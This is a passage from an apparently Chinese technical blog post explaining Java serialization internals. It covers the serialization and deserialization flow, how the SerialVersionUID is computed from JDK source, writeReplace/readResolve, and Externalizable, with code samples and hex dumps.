p..&#125;.sr.</span><br><span class="line">1b 53 65 72 69 61 6c 69  7a 61 74 69 6f 6e 43 6f    .Seriali zationCo</span><br><span class="line">6d 70 6f 6e 65 6e 74 43  6c 61 73 73 3c 76 ba b7    mponentC lass&lt;v..</span><br><span class="line">dd 9e 76 c4 02 00 01 4c  00 0e 63 6f 6d 70 6f 6e    ..v....L ..compon</span><br><span class="line">65 6e 74 46 69 65 6c 64  71 00 7e 00 02 78 70 70    entField q.~..xpp</span><br><span class="line">74 00 05 67 79 79 79 79                             t..gyyyy</span><br></pre></td></tr></table></figure></div><p>简单的分析一下序列化的执行流程：</p><ol><li><code>ObjectOutputStream</code>实例初始化时，将魔术头和版本号写入<code>bout</code> <em>（<code>BlockDataOutputStream</code>类型）</em> 中</li><li>调用<code>ObjectOutputStream.writeObject()</code>开始写对象数据<ul><li><code>ObjectStreamClass.lookup()</code>封装待序列化的类描述 <em>（返回<code>ObjectStreamClass</code>类型）</em> ，获取包括类名、自定义<code>serialVersionUID</code>、可序列化字段 <em>（返回<code>ObjectStreamField</code>类型）</em> 和构造方法，以及<code>writeObject</code>、<code>readObject</code>方法等</li><li><code>writeOrdinaryObject()</code>写入对象数据<ul><li>写入对象类型标识</li><li><code>writeClassDesc()</code>进入分支<code>writeNonProxyDesc()</code>写入类描述数据<ul><li>写入类描述符标识</li><li>写入类名</li><li>写入SUID <em>（当SUID为空时，会进行计算并赋值，细节见下面关于SerialVersionUID章节）</em></li><li>计算并写入序列化属性标志位</li><li>写入字段信息数据</li><li>写入Block Data结束标识</li><li>写入父类描述数据</li></ul></li><li><code>writeSerialData()</code>写入对象的序列化数据<ul><li>若类自定义了<code>writeObject()</code>，则调用该方法写对象，否则调用<code>defaultWriteFields()</code>写入对象的字段数据 <em>（若是非原始类型，则递归处理子对象）</em></li></ul></li></ul></li></ul></li></ol><hr><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="继续用简单的示例来看看反序列化："><a href="#继续用简单的示例来看看反序列化：" class="headerlink" title="继续用简单的示例来看看反序列化："></a>继续用简单的示例来看看反序列化：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] data; <span class="comment">// read from file or request</span></span><br><span class="line">    ByteArrayInputStream bin = <span class="keyword">new</span> ByteArrayInputStream(data);</span><br><span class="line">    ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bin);</span><br><span class="line">    SerializationDemo demo = (SerializationDemo) in.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>它的执行流程如下：</p><ol><li><code>ObjectInputStream</code>实例初始化时，读取魔术头和版本号进行校验</li><li>调用<code>ObjectInputStream.readObject()</code>开始读对象数据<ul><li>读取对象类型标识</li><li><code>readOrdinaryObject()</code>读取数据对象<ul><li><code>readClassDesc()</code>读取类描述数据<ul><li>读取类描述符标识，进入分支<code>readNonProxyDesc()</code></li><li>读取类名</li><li>读取SUID</li><li>读取并分解序列化属性标志位</li><li>读取字段信息数据</li><li><code>resolveClass()</code>根据类名获取待反序列化的类的<code>Class</code>对象，如果获取失败，则抛出<code>ClassNotFoundException</code></li><li><code>skipCustomData()</code>循环读取字节直到Block Data结束标识为止</li><li>读取父类描述数据</li><li><code>initNonProxy()</code>中判断对象与本地对象的SUID和类名 <em>（不含包名）</em> 是否相同，若不同，则抛出<code>InvalidClassException</code></li></ul></li><li><code>ObjectStreamClass.newInstance()</code>获取并调用离对象最近的非<code>Serializable</code>的父类的无参构造方法 <em>（若不存在，则返回<code>null</code>）</em> 创建对象实例</li><li><code>readSerialData()</code>读取对象的序列化数据<ul><li>若类自定义了<code>readObject()</code>，则调用该方法读对象，否则调用<code>defaultReadFields()</code>读取并填充对象的字段数据</li></ul></li></ul></li></ul></li></ol><hr><h3 id="关于SerialVersionUID"><a href="#关于SerialVersionUID" class="headerlink" title="关于SerialVersionUID"></a>关于SerialVersionUID</h3><p>在Java的序列化机制中，SUID占据着很重要的位置，它相当于一个<code>对象的指纹信息</code>，可以直接决定反序列化的成功与否，通过上面对序列化和反序列化流程的分析也可以看出来，若SUID不一致，是无法反序列化成功的。</p><p>但是，SUID到底是如何生成的，它的指纹信息维度包括对象的哪些内容，可能还是有很多同学不太清楚。这里我们对照 <a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/class.html#a4100" target="_blank" rel="noopener">官方文档</a> 的说明，结合JDK的源代码来为大家简单的梳理一下。</p><p>首先<code>ObjectStreamClass.getSerialVersionUID()</code>在获取SUID时，会判断SUID是否已经存在，若不存在才调用<code>computeDefaultSUID()</code>计算默认的SUID：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getSerialVersionUID</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (suid == <span class="keyword">null</span>) &#123;</span><br><span class="line">        suid = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> PrivilegedAction&lt;Long&gt;() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Long <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> computeDefaultSUID(cl);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> suid.longValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>先顺带提一嘴，<code>AccessController.doPrivileged()</code>会忽略JRE配置的安全策略的检查，以特权的身份去执行<code>PrivilegedAction</code>接口中的<code>run()</code>，可以防止JDK底层在进行序列化和反序列化时可能出现的一些权限问题。这些内容与本文主题无关，不多作详细解释，感兴趣的同学可以去看看Java的Security包和其中的java.policy、java.security文件内容。</p><p>重点来了，计算SUID时，会先创建一个<code>DataOutputStream</code>对象，所有二进制数据写入其包装的<code>ByteArrayOutputStream</code>中：</p><ol><li>写入类名 <em>（UTF8）</em> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dout.writeUTF(cl.getName());</span><br></pre></td></tr></table></figure></div></li><li>写入类访问权限标识 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> classMods = cl.getModifiers() &amp;</span><br><span class="line">    (Modifier.PUBLIC | Modifier.FINAL |</span><br><span class="line">        Modifier.INTERFACE | Modifier.ABSTRACT);</span><br><span class="line"></span><br><span class="line">Method[] methods = cl.getDeclaredMethods();</span><br><span class="line"><span class="keyword">if</span> ((classMods &amp; Modifier.INTERFACE) != <span class="number">0</span>) &#123;</span><br><span class="line">    classMods = (methods.length &gt; <span class="number">0</span>) ?</span><br><span class="line">        (classMods | Modifier.ABSTRACT) :</span><br><span class="line">        (classMods &amp; ~Modifier.ABSTRACT);</span><br><span class="line">&#125;</span><br><span class="line">dout.writeInt(classMods);</span><br></pre></td></tr></table></figure></div></li><li>如果不是数组类型，写入实现接口的接口名，按接口名排序 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!cl.isArray()) &#123;</span><br><span class="line">    Class&lt;?&gt;[] interfaces = cl.getInterfaces();</span><br><span class="line">    String[] ifaceNames = <span class="keyword">new</span> String[interfaces.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; interfaces.length; i++) &#123;</span><br><span class="line">        ifaceNames[i] = interfaces[i].getName();</span><br><span class="line">    &#125;</span><br><span class="line">    Arrays.sort(ifaceNames);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ifaceNames.length; i++) &#123;</span><br><span class="line">        dout.writeUTF(ifaceNames[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li>写入非私有静态或瞬态字段信息数据，包括字段名、字段访问权限标识和字段签名，按字段名排序 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields = cl.getDeclaredFields();</span><br><span class="line">MemberSignature[] fieldSigs = <span class="keyword">new</span> MemberSignature[fields.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">    fieldSigs[i] = <span class="keyword">new</span> MemberSignature(fields[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(fieldSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ms1.name.compareTo(ms2.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fieldSigs.length; i++) &#123;</span><br><span class="line">    MemberSignature sig = fieldSigs[i];</span><br><span class="line">    <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">        (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">            Modifier.STATIC | Modifier.FINAL | Modifier.VOLATILE |</span><br><span class="line">            Modifier.TRANSIENT);</span><br><span class="line">    <span class="keyword">if</span> (((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) ||</span><br><span class="line">        ((mods &amp; (Modifier.STATIC | Modifier.TRANSIENT)) == <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        dout.writeUTF(sig.name);</span><br><span class="line">        dout.writeInt(mods);</span><br><span class="line">        dout.writeUTF(sig.signature);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li>如果存在类初始化器 <em>（不是类实例化的构造方法，感兴趣的同学可以去看看JVM规范中的相关内容）</em> ，写入固定的初始化器信息数据 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (hasStaticInitializer(cl)) &#123;</span><br><span class="line">    dout.writeUTF(<span class="string">"&lt;clinit&gt;"</span>);</span><br><span class="line">    dout.writeInt(Modifier.STATIC);</span><br><span class="line">    dout.writeUTF(<span class="string">"()V"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li>写入非私有构造方法信息数据，包括方法名 <em>（固定为<code>&lt;init&gt;</code>）</em> 、方法访问权限标识和方法签名 <em>（分隔符<code>/</code>会替换成<code>.</code>的包名形式）</em> ，按方法签名排序 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt;[] cons = cl.getDeclaredConstructors();</span><br><span class="line">MemberSignature[] consSigs = <span class="keyword">new</span> MemberSignature[cons.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cons.length; i++) &#123;</span><br><span class="line">    consSigs[i] = <span class="keyword">new</span> MemberSignature(cons[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(consSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ms1.signature.compareTo(ms2.signature);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; consSigs.length; i++) &#123;</span><br><span class="line">    MemberSignature sig = consSigs[i];</span><br><span class="line">    <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">        (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">            Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">            Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">            Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">    <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">        dout.writeUTF(<span class="string">"&lt;init&gt;"</span>);</span><br><span class="line">        dout.writeInt(mods);</span><br><span class="line">        dout.writeUTF(sig.signature.replace(<span class="string">'/'</span>, <span class="string">'.'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li>写入非私有方法，包括方法名、方法访问权限标识和方法签名，按方法名和方法签名排序 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">MemberSignature[] methSigs = <span class="keyword">new</span> MemberSignature[methods.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">    methSigs[i] = <span class="keyword">new</span> MemberSignature(methods[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(methSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> comp = ms1.name.compareTo(ms2.name);</span><br><span class="line">        <span class="keyword">if</span> (comp == <span class="number">0</span>) &#123;</span><br><span class="line">            comp = ms1.signature.compareTo(ms2.signature);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> comp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methSigs.length; i++) &#123;</span><br><span class="line">    MemberSignature sig = methSigs[i];</span><br><span class="line">    <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">        (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">            Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">            Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">            Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">    <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">        dout.writeUTF(sig.name);</span><br><span class="line">        dout.writeInt(mods);</span><br><span class="line">        dout.writeUTF(sig.signature.replace(<span class="string">'/'</span>, <span class="string">'.'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><p>以上就是SUID中包含的类的所有信息，得到的二进制串如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 11 53 65 72 69 61 6c  69 7a 61 74 69 6f 6e 44    ..Serial izationD</span><br><span class="line">65 6d 6f 00 00 00 01 00  14 6a 61 76 61 2e 69 6f    emo..... .java.io</span><br><span class="line">2e 53 65 72 69 61 6c 69  7a 61 62 6c 65 00 08 69    .Seriali zable..i</span><br><span class="line">6e 74 46 69 65 6c 64 00  00 00 02 00 01 49 00 0b    ntField. .....I..</span><br><span class="line">73 74 72 69 6e 67 46 69  65 6c 64 00 00 00 02 00    stringFi eld.....</span><br><span class="line">12 4c 6a 61 76 61 2f 6c  61 6e 67 2f 53 74 72 69    .Ljava&#x2F;l ang&#x2F;Stri</span><br><span class="line">6e 67 3b 00 06 3c 69 6e  69 74 3e 00 00 00 01 00    ng;..&lt;in it&gt;.....</span><br><span class="line">16 28 4c 6a 61 76 61 2e  6c 61 6e 67 2e 53 74 72    .(Ljava. lang.Str</span><br><span class="line">69 6e 67 3b 49 29 56 00  04 6d 61 69 6e 00 00 00    ing;I)V. .main...</span><br><span class="line">09 00 16 28 5b 4c 6a 61  76 61 2e 6c 61 6e 67 2e    ...([Lja va.lang.</span><br><span class="line">53 74 72 69 6e 67 3b 29  56                         String;)V</span><br></pre></td></tr></table></figure></div><p>最后，将二进制数据通过SHA1算法得到摘要，取前8位按BigEndian的字节顺序转换成长整型：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> hash = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = Math.min(hashBytes.length, <span class="number">8</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    hash = (hash &lt;&lt; <span class="number">8</span>) | (hashBytes[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>返回的<code>hash</code>就是最终的SUID了。</p><p>由此可知，当父类或非原始数据类型字段的类内部发生变更时，并不会影响当前类的SUID值，再结合之前的内容我们还可以引申出两个结论：</p><ol><li>若当前类自定义了<code>readObject()</code>，在反序列化时会正常执行<code>readObject()</code>中所有<code>ObjectInputStream.defaultReadObject()</code> <em>（如果调用了的话）</em> 之前的逻辑；否则在处理到变更对象时，仍会抛出<code>InvalidClassException</code></li><li>由于序列化会对类的字段进行排序，并在反序列化时按顺序遍历处理，所以反序列化会正常处理字段名比变更对象类型字段『小』的其他字段</li></ol><h3 id="关于writeReplace-和readResolve"><a href="#关于writeReplace-和readResolve" class="headerlink" title="关于writeReplace()和readResolve()"></a>关于<code>writeReplace()</code>和<code>readResolve()</code></h3><p>在前面的执行流程分析中，为了突出主要逻辑，我们主观的忽略了一些内容，其中就包括了序列化的<code>invokeWriteReplace()</code>和反序列化的<code>invokeReadResolve()</code>。</p><p>现在就来看看它们分别有什么作用：</p><ul><li><p><code>writeReplace()</code></p><p>  返回一个对象，该对象为实际被序列化的对象，在原对象序列化之前被调用，替换原对象成为待序列化对象</p></li><li><p><code>readResolve()</code></p><p>  返回一个对象，该对象为实际反序列化的结果对象，在原对象反序列化之后被调用，不影响原对象的反序列化过程，仅替换结果</p></li></ul><p>再从具体示例来体会一下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationReplacementClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String replacementField;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SerializationReplacementClass(<span class="string">"resolve"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SerializationReplacementClass</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.replacementField = s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SerializationReplacementClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.replacementField = <span class="string">"replace"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">writeReplace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SerializationReplacementClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// omit</span></span><br><span class="line">        SerializationReplacementClass demo = (SerializationReplacementClass) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>从序列化之后得到的二进制串中可以看到目标对象已经被替换成了<code>SerializationReplacementClass</code>：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 1d  53 65 72 69 61 6c 69 7a    ....sr.. Serializ</span><br><span class="line">61 74 69 6f 6e 52 65 70  6c 61 63 65 6d 65 6e 74    ationRep lacement</span><br><span class="line">43 6c 61 73 73 32 71 ac  e9 c1 d3 0b 7b 02 00 01    Class2q. ....&#123;...</span><br><span class="line">4c 00 10 72 65 70 6c 61  63 65 6d 65 6e 74 46 69    L..repla cementFi</span><br><span class="line">65 6c 64 74 00 12 4c 6a  61 76 61 2f 6c 61 6e 67    eldt..Lj ava&#x2F;lang</span><br><span class="line">2f 53 74 72 69 6e 67 3b  78 70 74 00 07 72 65 70    &#x2F;String; xpt..rep</span><br><span class="line">6c 61 63 65                                         lace</span><br></pre></td></tr></table></figure></div><p>而在反序列化之后得到的对象的<code>replacementField</code>字段值则为<code>resolve</code>，但在此之前<code>readObject()</code>也会被正常调用，当时<code>replacementField</code>字段值为<code>replace</code>。</p><h3 id="关于Externalizable"><a href="#关于Externalizable" class="headerlink" title="关于Externalizable"></a>关于<code>Externalizable</code></h3><p><code>Serializable</code>接口还有一个比较常见的子类<code>Externalizable</code>，它比它爸爸特殊的地方就在于它需要自己实现读写方法 <em>（<code>readExternal()</code>和<code>writeExternal()</code>）</em> ，同时必须包含一个自己的无参构造方法 <em>（默认隐式的也可以）</em> 。</p><p>仍以示例说话：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExternalizationDemo</span> <span class="keyword">implements</span> <span class="title">Externalizable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String stringField;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> intField;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        out.writeUTF(<span class="keyword">this</span>.stringField);</span><br><span class="line">        out.writeInt(<span class="keyword">this</span>.intField);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stringField = <span class="string">"hello, i'm "</span> + in.readUTF();</span><br><span 